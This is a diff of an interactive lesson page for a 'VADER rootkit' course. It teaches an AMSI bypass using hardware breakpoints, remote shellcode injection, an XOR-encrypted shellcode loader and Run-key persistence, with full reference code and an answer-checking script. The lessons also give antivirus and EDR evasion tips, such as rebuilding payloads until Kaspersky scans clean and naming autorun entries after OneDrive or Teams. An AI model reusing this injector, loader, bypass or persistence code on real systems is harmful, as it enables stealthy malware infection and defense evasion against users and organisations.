-          <p><code>CONTEXT_DEBUG_REGISTERS</code> — tells GetThreadContext to populate the debug register fields (DR0-DR7). DR0 holds the breakpoint address. DR7 is the control register — bit 0 enables DR0 as a local execution breakpoint.</p>
-          <p><code>ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1</code> — clear the bottom 4 bits, set bit 0 (enable DR0, local). The other bits control breakpoint type (read/write/execute) and condition width. 0x1 = execute.</p>
-          <p>When execution hits the breakpoint, Windows fires <code>EXCEPTION_SINGLE_STEP</code>. Our VEH handler catches it. <code>Rax = 0</code> sets the return value to AMSI_RESULT_CLEAN. <code>Rip += 1</code> skips one instruction so we don't loop. <code>EXCEPTION_CONTINUE_EXECUTION</code> resumes.</p>
-          <p>Zero memory writes. Zero signature. The CPU registers the hook, not the memory scanner.</p>
-        </div>
-        <button class="btn-next" id="next-2" onclick="goLesson(3)">NEXT: PROCESS INJECTION →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(1)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(2)">SKIP →</button>
-      </div>
-    </div>
-
-    <div class="lesson" id="lesson-3">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 03 / 05</div>
-        <h2>PROCESS INJECTION — CLASSIC TRIAD</h2>
-        <div class="desc">Write shellcode into a target process's memory space, then create a thread there to execute it. Three API calls: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// THE THREE API CALLS</h3>
-        <p><code>VirtualAllocEx</code> — allocate memory in the target process. Request RWX (read/write/execute) permissions. Returns the address of the new allocation in the target's address space.</p>
-        <p><code>WriteProcessMemory</code> — write your shellcode bytes into that allocated region. You're writing into another process's memory from outside it.</p>
-        <p><code>CreateRemoteThread</code> — create a new thread in the target process, starting at the address you just wrote to. The thread executes your shellcode in the context of the target process.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write inject_shellcode() in C</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>BOOL inject_shellcode(DWORD pid, BYTE *shellcode, SIZE_T sc_len) {
+<!-- LESSON 3 -->
+<div class="lesson" id="lesson-3">
+  <div class="lesson-header">
+    <span class="lang-badge lang-c">C — WIN32 API</span>
+    <div class="lesson-tag">// LESSON 03 / 05 — PROCESS INJECTION</div>
+    <h2>Parachuting into the Barracks — Remote Memory Execution</h2>
+    <p>Allocate memory in a remote process, write shellcode into it, create a thread in that process to execute it. Three Win32 API calls. The shellcode runs inside the target process's address space — using its privileges, its identity, its loaded modules.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    You parachute a fire team into the enemy barracks at night. They land in the enemy's own building (address space), wearing the enemy's uniform (running under the enemy process's token), and operate from inside. <strong>VirtualAllocEx = clear a room in the barracks. WriteProcessMemory = the team moves in. CreateRemoteThread = team goes operational. The target process's security context is now your execution context.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — PROCESS INJECTION</h4>
+    <table>
+      <tr><td><code>OpenProcess</code></td><td>Gets a handle to an existing process by PID. You need specific access rights: VM_WRITE + VM_OPERATION to allocate/write memory, CREATE_THREAD to start execution there.</td></tr>
+      <tr><td><code>VirtualAllocEx</code></td><td>Allocates memory in a REMOTE process's address space. Unlike VirtualAlloc (local), this targets another process's address space. Returns a pointer valid in that process, not yours.</td></tr>
+      <tr><td><code>MEM_COMMIT | MEM_RESERVE</code></td><td>Reserve the virtual address range AND commit the physical pages. Both required. Reserve alone = no backing memory. Commit alone on a new range fails.</td></tr>
+      <tr><td><code>PAGE_EXECUTE_READWRITE</code></td><td>Memory protection: the CPU can execute, read, and write this region. Required for shellcode. EDRs monitor for this combination — it's a high-fidelity injection indicator.</td></tr>
+      <tr><td><code>WriteProcessMemory</code></td><td>Copies bytes from your process into another process's memory. Writes the shellcode bytes to the address returned by VirtualAllocEx.</td></tr>
+      <tr><td><code>CreateRemoteThread</code></td><td>Creates a thread in a remote process. lpStartAddress = your allocated + written shellcode address. The thread starts executing there under the target process's context.</td></tr>
+      <tr><td><code>WaitForSingleObject</code></td><td>Block until the thread handle signals (thread exits) or the timeout expires. 5000 = 5 second timeout. Ensures shellcode completes before you clean up handles.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>BOOL inject_shellcode(DWORD pid, BYTE *shellcode, SIZE_T sc_len) {
     HANDLE proc = OpenProcess(
         PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
-        FALSE, pid
+        FALSE, pid                     <span class="cm"># open target process with minimum required rights</span>
     );
-    if (!proc) return FALSE;
+    if (!proc) return FALSE;           <span class="cm"># failed to open — no rights or pid invalid</span>
     LPVOID mem = VirtualAllocEx(proc, NULL, sc_len,
-        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        MEM_COMMIT | MEM_RESERVE,      <span class="cm"># reserve + commit: allocate real pages</span>
+        PAGE_EXECUTE_READWRITE);       <span class="cm"># rwx: shellcode needs execute + write permissions</span>
     if (!mem) { CloseHandle(proc); return FALSE; }
     SIZE_T written = 0;
-    WriteProcessMemory(proc, mem, shellcode, sc_len, &written);
+    WriteProcessMemory(proc, mem, shellcode, sc_len, &amp;written);  <span class="cm"># copy shellcode bytes in</span>
     HANDLE thread = CreateRemoteThread(
-        proc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL
+        proc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)mem,   <span class="cm"># entry point = start of our shellcode</span>
+        NULL, 0, NULL
     );
-    WaitForSingleObject(thread, 5000);
+    WaitForSingleObject(thread, 5000); <span class="cm"># wait up to 5s for shellcode to complete</span>
     CloseHandle(thread);
     CloseHandle(proc);
     return TRUE;
 }</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-3" placeholder="BOOL inject_shellcode(DWORD pid, BYTE *shellcode, SIZE_T sc_len) {
-    // OpenProcess with VM_WRITE + VM_OPERATION + CREATE_THREAD
-    // VirtualAllocEx PAGE_EXECUTE_READWRITE
-    // WriteProcessMemory
-    // CreateRemoteThread starting at the allocated mem
-}"></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(3)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(3)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-3"></div>
-        <div class="explain-box" id="explain-3">
-          <h3>// WHAT JUST HAPPENED</h3>
-          <p><code>PROCESS_VM_WRITE | PROCESS_VM_OPERATION</code> — required to write memory. <code>PROCESS_CREATE_THREAD</code> — required to create a remote thread. OpenProcess fails if the target runs at higher integrity or the call lacks SeDebugPrivilege.</p>
-          <p><code>PAGE_EXECUTE_READWRITE</code> — RWX memory. Write to it then execute from it. Modern EDRs flag RWX allocations — a stealth improvement is to allocate RW, write, then change to RX with VirtualProtectEx before executing.</p>
-          <p><code>WaitForSingleObject(thread, 5000)</code> — waits 5 seconds for the injected thread to exit. Without this, the injector exits and the injected shellcode may be killed before it finishes.</p>
-          <p>The vader_inject.c and vader_inject_annotated.obj in CHEYANNE implement this with additional improvements: PPID spoof, RW-then-RX, and shellcode XOR decryption in the target process.</p>
-        </div>
-        <button class="btn-next" id="next-3" onclick="goLesson(4)">NEXT: XOR OBFUSCATION →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(2)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(3)">SKIP →</button>
-      </div>
-    </div>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write inject_shellcode(). Open the process, allocate RWX memory remotely, write the shellcode bytes, create the remote thread, wait 5 seconds, close all handles, return TRUE.</p>
+  <textarea class="code-editor" id="editor-3" spellcheck="false" placeholder="BOOL inject_shellcode(DWORD pid, BYTE *shellcode, SIZE_T sc_len) {&#10;    HANDLE proc = OpenProcess(...);&#10;    // alloc, write, create thread, wait, cleanup...&#10;}"></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(3)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(3)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-3"></div>
+  <div class="explain" id="explain-3">
+    <h4>// WHY THIS WORKS</h4>
+    <p>The three-API sequence (alloc → write → execute) is the classic injection pattern. PAGE_EXECUTE_READWRITE is the required flag — shellcode needs to be both written by you and executed by the target thread. This flag combination is a primary EDR detection signal; more advanced techniques split alloc+write (RW) from execution (RX) using VirtualProtectEx to reduce the detection surface.</p>
+  </div>
+  <div class="next-wrap" id="next-3">
+    <button class="btn btn-prev" onclick="goLesson(2)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(4)">NEXT LESSON →</button>
+  </div>
+</div>
 
-    <div class="lesson" id="lesson-4">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 04 / 05</div>
-        <h2>XOR OBFUSCATION — ENCRYPT ON DISK</h2>
-        <div class="desc">XOR-encrypt the shellcode before it goes into the PE. The binary on disk contains ciphertext. AV scans ciphertext — no signature match. At runtime, XOR-decrypt in memory and execute.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// WHY XOR</h3>
-        <p>XOR encryption is symmetric — XOR with key to encrypt, XOR with same key to decrypt. One operation serves both directions. Simple. Fast. Zero dependencies.</p>
-        <p>AV signatures look for known shellcode byte sequences. If the shellcode is XOR'd with a random key, the on-disk bytes match nothing. The key is compiled into the binary — reversible, but that's enough to defeat static analysis.</p>
-        <p>CHEYANNE's ghost_fud.exe uses this with a random seed per build. The FUD loop (metamorph.py) generates different seeds until Kaspersky returns clean. Seed 66728 = CLEAN.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the XOR encrypt/decrypt function in C</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>void xor_crypt(BYTE *buf, SIZE_T len, BYTE key) {
-    for (SIZE_T i = 0; i < len; i++) {
-        buf[i] ^= key;
+<!-- LESSON 4 -->
+<div class="lesson" id="lesson-4">
+  <div class="lesson-header">
+    <span class="lang-badge lang-c">C — CRYPTOGRAPHY</span>
+    <div class="lesson-tag">// LESSON 04 / 05 — XOR OBFUSCATION</div>
+    <h2>The Two-Way Cipher — XOR is its Own Inverse</h2>
+    <p>XOR with a key encrypts. XOR with the same key again decrypts. Same operation, same key, both directions. You store shellcode XOR-encrypted on disk — no static signature to match. At runtime, decrypt in-memory, execute. The key never touches disk.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    One-time pad cipher with a single repeating byte key. You encode a message by XORing each letter with the key. The recipient XORs each letter with the same key to decode. No key = gibberish. <strong>XOR is perfectly symmetric: (A XOR key) XOR key = A. Always. This means one function both encrypts and decrypts. The encrypted shellcode on disk matches no AV signature. Memory-only decryption means the key stays in your code, not in the payload.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — XOR + MEMORY</h4>
+    <table>
+      <tr><td><code>^=</code></td><td>XOR assignment. <code>buf[i] ^= key</code> is shorthand for <code>buf[i] = buf[i] ^ key</code>. Applies XOR in-place: the buffer is modified directly without allocating new memory.</td></tr>
+      <tr><td>XOR symmetry</td><td>a XOR b XOR b = a. Always. Apply the key twice and you're back to the original. This is why one function handles both encrypt and decrypt — the operation is identical.</td></tr>
+      <tr><td><code>VirtualAlloc</code></td><td>Local version of VirtualAllocEx. Allocates memory in your own process. MEM_COMMIT = commit pages immediately. PAGE_EXECUTE_READWRITE = rwx for execution.</td></tr>
+      <tr><td><code>memcpy(buf, encrypted, len)</code></td><td>Copy encrypted bytes into freshly-allocated memory. You don't decrypt the stored data — you copy it to a new buffer, then decrypt the copy. The original array stays encrypted.</td></tr>
+      <tr><td><code>((void(*)())buf)()</code></td><td>C function pointer cast. Cast the buffer address to a "function returning void, taking no args" pointer, then call it. This jumps execution to the start of the decrypted shellcode.</td></tr>
+      <tr><td>BYTE key</td><td>One byte. Values 0-255. The simplest XOR key — same byte repeated across the entire payload. Weak against frequency analysis but defeats static AV signatures on the ciphertext.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>void xor_crypt(BYTE *buf, SIZE_T len, BYTE key) {
+    for (SIZE_T i = 0; i &lt; len; i++) {
+        buf[i] ^= key;               <span class="cm"># XOR each byte with key. Encrypt OR decrypt — same op.</span>
     }
 }
-
 void decrypt_and_run(BYTE *encrypted, SIZE_T len, BYTE key) {
     BYTE *buf = (BYTE *)VirtualAlloc(NULL, len,
-        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(buf, encrypted, len);
-    xor_crypt(buf, len, key);
-    ((void(*)())buf)();
+        MEM_COMMIT, PAGE_EXECUTE_READWRITE);  <span class="cm"># rwx memory: we write, CPU executes</span>
+    memcpy(buf, encrypted, len);    <span class="cm"># copy encrypted shellcode into fresh allocation</span>
+    xor_crypt(buf, len, key);       <span class="cm"># XOR-decrypt in-place (same function as encrypt)</span>
+    ((void(*)())buf)();             <span class="cm"># cast to function pointer + call → execute shellcode</span>
 }</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-4" placeholder="void xor_crypt(BYTE *buf, SIZE_T len, BYTE key) {
-    // XOR every byte with key
-}
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write xor_crypt() (in-place XOR loop over buffer) and decrypt_and_run() (allocate RWX memory, copy encrypted bytes in, XOR-decrypt in-place, cast and execute).</p>
+  <textarea class="code-editor" id="editor-4" spellcheck="false" placeholder="void xor_crypt(BYTE *buf, SIZE_T len, BYTE key) {&#10;    for (SIZE_T i = 0; i < len; i++) {&#10;        ...&#10;    }&#10;}&#10;void decrypt_and_run(BYTE *encrypted, SIZE_T len, BYTE key) {&#10;    ...&#10;}"></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(4)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(4)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-4"></div>
+  <div class="explain" id="explain-4">
+    <h4>// WHY THIS WORKS</h4>
+    <p>The encrypted shellcode blob on disk is random-looking bytes — no recognisable header, no known byte sequences. AV signature matching fails. At runtime you allocate fresh memory (not from the executable image, so no memory-mapped file monitoring), copy and decrypt there, and execute. The key is embedded in your .exe's code section — it's never written to disk separately.</p>
+  </div>
+  <div class="next-wrap" id="next-4">
+    <button class="btn btn-prev" onclick="goLesson(3)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(5)">NEXT LESSON →</button>
+  </div>
+</div>
 
-void decrypt_and_run(BYTE *encrypted, SIZE_T len, BYTE key) {
-    // Alloc RWX, copy, XOR decrypt, cast to fn pointer and call
-}"></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(4)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(4)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-4"></div>
-        <div class="explain-box" id="explain-4">
-          <h3>// WHAT JUST HAPPENED</h3>
-          <p><code>buf[i] ^= key</code> — XOR every byte with the key. To encrypt: call on plaintext. To decrypt: call again on ciphertext with same key. XOR is its own inverse.</p>
-          <p><code>((void(*)())buf)()</code> — cast the buffer pointer to a function pointer and call it. This is how shellcode executes from a buffer: the bytes ARE machine code, calling them as a function executes them.</p>
-          <p>The stealth improvement in vader_clean_annotated.obj: allocate as RW, XOR decrypt, then <code>VirtualProtect</code> to RX before calling. This avoids creating RWX memory — a high-signal EDR indicator. Two-step allocation is much quieter.</p>
-        </div>
-        <button class="btn-next" id="next-4" onclick="goLesson(5)">NEXT: REGISTRY PERSIST →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(3)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(4)">SKIP →</button>
-      </div>
-    </div>
-
-    <div class="lesson" id="lesson-5">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 05 / 05</div>
-        <h2>REGISTRY PERSISTENCE</h2>
-        <div class="desc">Write to HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute a payload on every login. No admin required. Survives reboots. This is what the TCP shell's persist command does automatically.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// THE RUN KEY</h3>
-        <p>Windows reads <code>HKCU\...\Run</code> on every logon and executes every value in it. No UAC prompt because HKCU is user-writable. No admin because it's your own user hive.</p>
-        <p>The test_local_chain.py validates this: after the TCP shell establishes, it sends the <code>persist</code> command, then reads the Run key back to verify the entry was written.</p>
-        <p>Detection: defenders check this key. To be stealthier, use: scheduled tasks (<code>schtasks</code>), WMI subscriptions, or COM object hijacking. The Run key is the most obvious but simplest.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the Python persistence installer</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>import winreg
+<!-- LESSON 5 -->
+<div class="lesson" id="lesson-5">
+  <div class="lesson-header">
+    <span class="lang-badge lang-python">PYTHON 3 — WINREG</span>
+    <div class="lesson-tag">// LESSON 05 / 05 — REGISTRY PERSISTENCE</div>
+    <h2>The Standing Order — Run Key Persistence</h2>
+    <p>Windows executes every value under HKCU\...\Run at login. Write your exe path there and it runs every time the user logs in — no admin required, no service install, no scheduled task. HKCU (Current User) is writable without elevation.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    Standing orders at the gate: every time the base opens for the day, execute these commands before anything else. The registry Run key is the standing order board. <strong>You write your exe's path as a value under HKCU\...\Run. Windows reads all values there at every login and executes them. No special permission needed — every user can write to their own HKCU branch. Verify by reading back and confirming the path is intact.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — WINREG</h4>
+    <table>
+      <tr><td><code>winreg</code></td><td>Python's built-in Windows Registry module. Wraps the Win32 RegOpenKey, RegSetValue, RegQueryValue functions. No external dependencies.</td></tr>
+      <tr><td><code>HKEY_CURRENT_USER</code></td><td>The registry hive for the currently logged-in user. Abbreviated HKCU. Writable without administrator rights — every user owns their own HKCU branch.</td></tr>
+      <tr><td><code>r"Software\Microsoft\..."</code></td><td>Raw string (r"..."). The r prefix tells Python not to interpret backslashes as escape sequences. Registry paths use backslashes — use raw strings to avoid ambiguity.</td></tr>
+      <tr><td><code>KEY_SET_VALUE</code></td><td>Registry access right: permission to set/write values. Open the key with this right when you need to write. Use KEY_READ when you only need to query.</td></tr>
+      <tr><td><code>winreg.SetValueEx</code></td><td>Write a registry value. Args: key handle, value name, reserved (0), type (REG_SZ=string), data (the path string).</td></tr>
+      <tr><td><code>REG_SZ</code></td><td>Registry string type. A null-terminated Unicode string. Use this for file paths. Other types: REG_DWORD (32-bit int), REG_BINARY, REG_EXPAND_SZ (expands env vars).</td></tr>
+      <tr><td><code>winreg.QueryValueEx</code></td><td>Read a registry value. Returns (data, type). Use this to verify the written value matches what you set.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>import winreg
 
 def install_run_key(name, exe_path):
     key = winreg.OpenKey(
-        winreg.HKEY_CURRENT_USER,
+        winreg.HKEY_CURRENT_USER,                   <span class="cm"># HKCU — no admin required</span>
         r"Software\Microsoft\Windows\CurrentVersion\Run",
-        0, winreg.KEY_SET_VALUE
+        0, winreg.KEY_SET_VALUE                     <span class="cm"># open with write permission</span>
     )
-    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
+    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)  <span class="cm"># write path as string value</span>
     winreg.CloseKey(key)
     return True
 
@@ -387,56 +405,43 @@ def verify_run_key(name):
     key = winreg.OpenKey(
         winreg.HKEY_CURRENT_USER,
         r"Software\Microsoft\Windows\CurrentVersion\Run",
-        0, winreg.KEY_READ
+        0, winreg.KEY_READ                          <span class="cm"># open read-only for verification</span>
     )
-    val, _ = winreg.QueryValueEx(key, name)
+    val, _ = winreg.QueryValueEx(key, name)         <span class="cm"># read back — returns (data, type)</span>
     winreg.CloseKey(key)
-    return val</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-5" placeholder="import winreg
-
-def install_run_key(name, exe_path):
-    # Open HKCU Run key with KEY_SET_VALUE
-    # Write exe_path as REG_SZ under name
-    ...
-
-def verify_run_key(name):
-    # Read the value back and return it
-    ..."></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(5)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(5)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-5"></div>
-        <div class="explain-box" id="explain-5">
-          <h3>// WHAT JUST HAPPENED — VADER ROOTKIT COMPLETE</h3>
-          <p><code>winreg.KEY_SET_VALUE</code> — the permission needed to write values. <code>KEY_READ</code> for reading. Requesting more permissions than needed increases the chance of triggering audit logs.</p>
-          <p><code>winreg.REG_SZ</code> — registry string type. The value is a path to an executable (or a quoted path with arguments).</p>
-          <p>In the CHEYANNE kill chain, the persist command runs this through the TCP shell on the victim. The test_local_chain.py runs persist on localhost and reads the key back to confirm — that's the 8th check in the 8/8 PASS sequence.</p>
-          <p>VADER rootkit combined all five techniques: DLL hijacking for delivery, HWBP for AMSI evasion, process injection for payload execution, XOR for on-disk obfuscation, and Run key for persistence. Submitted to MSRC as VULN-195458.</p>
-        </div>
-        <button class="btn-next" id="next-5" onclick="showComplete()">🎯 COURSE COMPLETE</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(4)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(5)">SKIP →</button>
-      </div>
-    </div>
-
-    <div class="complete-screen" id="complete-screen">
-      <h2>// VADER ROOTKIT — COMPLETE</h2>
-      <p>DLL hijack. HWBP AMSI bypass. Process injection. XOR obfuscation. Registry persistence.<br>This is the Windows internals kill chain.</p>
-      <p><a href="index.html">← Back to Catalog</a> &nbsp;|&nbsp; <a href="starkiller.html">Next: StarKiller →</a></p>
-    </div>
-  </main>
+    return val                                      <span class="cm"># return path string for comparison</span></pre>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write install_run_key() (open HKCU Run key for writing, SetValueEx, CloseKey, return True) and verify_run_key() (open read-only, QueryValueEx, CloseKey, return the path string).</p>
+  <textarea class="code-editor" id="editor-5" spellcheck="false" placeholder="import winreg&#10;&#10;def install_run_key(name, exe_path):&#10;    key = winreg.OpenKey(...)&#10;    ...&#10;&#10;def verify_run_key(name):&#10;    key = winreg.OpenKey(...)&#10;    ..."></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(5)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(5)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-5"></div>
+  <div class="explain" id="explain-5">
+    <h4>// WHY THIS WORKS</h4>
+    <p>HKCU\...\Run is one of the most monitored persistence locations — every EDR watches it. The advantage is it requires zero elevation and survives reboots without a service or scheduled task. The trade-off: high visibility. Real ops pair this with a name that looks like a legitimate autorun entry (OneDrive, Teams update, etc.).</p>
+  </div>
+  <div class="next-wrap" id="next-5">
+    <button class="btn btn-prev" onclick="goLesson(4)">← PREV</button>
+    <button class="btn btn-next" onclick="showComplete()">FINISH COURSE →</button>
+  </div>
 </div>
+
+<div class="complete-screen" id="complete-screen">
+  <h2>// VADER ROOTKIT — COMPLETE</h2>
+  <p>DLL hijack recon. HWBP AMSI bypass. Process injection. XOR shellcode. Registry persistence.<br>Five techniques from recon to persistence.</p>
+  <p><a href="index.html">← Back to Catalog</a> &nbsp;|&nbsp; <a href="starkiller.html">Next: StarKiller →</a></p>
+</div>
+</main>
+</div>
+
 <script>
-const COURSE_KEY='22div_course_rootkit';const TOTAL=5;
+const COURSE_KEY='22div_course_rootkit';
+const TOTAL=5;
 const EXPECTED={
-1:`$paths = $env:PATH -split ';'
+  1:`$paths = $env:PATH -split ';'
 foreach ($p in $paths) {
     if (-not (Test-Path $p)) { continue }
     $acl = Get-Acl $p -ErrorAction SilentlyContinue
@@ -449,7 +454,7 @@ foreach ($p in $paths) {
         Write-Output "[WRITABLE] $p"
     }
 }`,
-2:`void set_hwbp(HANDLE thread, void *target) {
+  2:`void set_hwbp(HANDLE thread, void *target) {
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     GetThreadContext(thread, &ctx);
@@ -465,7 +470,7 @@ LONG WINAPI amsi_handler(EXCEPTION_POINTERS *ep) {
     }
     return EXCEPTION_CONTINUE_SEARCH;
 }`,
-3:`BOOL inject_shellcode(DWORD pid, BYTE *shellcode, SIZE_T sc_len) {
+  3:`BOOL inject_shellcode(DWORD pid, BYTE *shellcode, SIZE_T sc_len) {
     HANDLE proc = OpenProcess(
         PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
         FALSE, pid
@@ -484,7 +489,7 @@ LONG WINAPI amsi_handler(EXCEPTION_POINTERS *ep) {
     CloseHandle(proc);
     return TRUE;
 }`,
-4:`void xor_crypt(BYTE *buf, SIZE_T len, BYTE key) {
+  4:`void xor_crypt(BYTE *buf, SIZE_T len, BYTE key) {
     for (SIZE_T i = 0; i < len; i++) {
         buf[i] ^= key;
     }
@@ -496,7 +501,7 @@ void decrypt_and_run(BYTE *encrypted, SIZE_T len, BYTE key) {
     xor_crypt(buf, len, key);
     ((void(*)())buf)();
 }`,
-5:`import winreg
+  5:`import winreg
 def install_run_key(name, exe_path):
     key = winreg.OpenKey(
         winreg.HKEY_CURRENT_USER,
@@ -517,17 +522,59 @@ def verify_run_key(name):
     return val`
 };
 function loadProgress(){return JSON.parse(localStorage.getItem(COURSE_KEY)||'{}');}
-function saveProgress(p){localStorage.setItem(COURSE_KEY,JSON.stringify(p));updateUI(p);}
-function updateUI(p){const done=Object.values(p).filter(Boolean).length;document.getElementById('overall-prog').style.width=Math.round(done/TOTAL*100)+'%';document.getElementById('overall-label').textContent=`${done} / ${TOTAL} complete`;for(let i=1;i<=TOTAL;i++){const el=document.getElementById(`nav-${i}`);if(el)el.classList.toggle('done',!!p[i]);}}
-let cur=1;
-function goLesson(n){document.getElementById(`lesson-${cur}`)?.classList.remove('active');document.getElementById(`nav-${cur}`)?.classList.remove('active');document.getElementById('complete-screen').classList.remove('show');cur=n;document.getElementById(`lesson-${n}`)?.classList.add('active');document.getElementById(`nav-${n}`)?.classList.add('active');window.scrollTo(0,0);}
-function showComplete(){document.getElementById(`lesson-${cur}`)?.classList.remove('active');document.getElementById('complete-screen').classList.add('show');window.scrollTo(0,0);}
+function saveProgress(p){localStorage.setItem(COURSE_KEY,JSON.stringify(p));updateProgressUI(p);}
+function updateProgressUI(p){
+  const done=Object.values(p).filter(Boolean).length;
+  const pct=Math.round((done/TOTAL)*100);
+  document.getElementById('overall-prog').style.width=pct+'%';
+  document.getElementById('overall-label').textContent=`${done} / ${TOTAL} complete`;
+  for(let i=1;i<=TOTAL;i++){const el=document.getElementById(`nav-${i}`);if(el)el.classList.toggle('done',!!p[i]);}
+}
+let currentLesson=1;
+function goLesson(n){
+  document.getElementById(`lesson-${currentLesson}`)?.classList.remove('active');
+  document.getElementById(`nav-${currentLesson}`)?.classList.remove('active');
+  document.getElementById('complete-screen').classList.remove('show');
+  currentLesson=n;
+  document.getElementById(`lesson-${n}`)?.classList.add('active');
+  document.getElementById(`nav-${n}`)?.classList.add('active');
+  window.scrollTo(0,0);
+}
+function showComplete(){
+  document.getElementById(`lesson-${currentLesson}`)?.classList.remove('active');
+  document.getElementById('complete-screen').classList.add('show');
+  window.scrollTo(0,0);
+}
 function normalize(c){return c.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('#')&&!l.startsWith('//')).join('\n');}
 function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
-function checkCode(n){const user=normalize(document.getElementById(`editor-${n}`).value);const exp=normalize(EXPECTED[n]||'');const ul=user.split('\n'),el=exp.split('\n');let ok=0,html='';el.forEach((e,i)=>{const u=ul[i]||'';if(u===e){ok++;html+=`<div class="line-ok">✓ ${escHtml(e)}</div>`;}else{html+=`<div class="line-err">✗ Exp: ${escHtml(e)}<br>&nbsp;&nbsp;Got: ${escHtml(u)||'(missing)'}</div>`;}});const re=document.getElementById(`result-${n}`),ed=document.getElementById(`editor-${n}`);if(ok===el.length){re.innerHTML=`<div class="result-pass">✓ CORRECT — ${ok}/${el.length}</div>`+html;ed.classList.add('pass');ed.classList.remove('fail');document.getElementById(`explain-${n}`)?.classList.add('show');document.getElementById(`next-${n}`)?.classList.add('show');const p=loadProgress();p[n]=true;saveProgress(p);}else{re.innerHTML=`<div class="result-fail">✗ ${ok}/${el.length} correct</div>`+html;ed.classList.add('fail');ed.classList.remove('pass');}}
-function skipLesson(n){const p=loadProgress();p[n]=true;saveProgress(p);document.getElementById(`explain-${n}`)?.classList.add('show');document.getElementById(`next-${n}`)?.classList.add('show');if(n<TOTAL)goLesson(n+1);else showComplete();}
-updateUI(loadProgress());
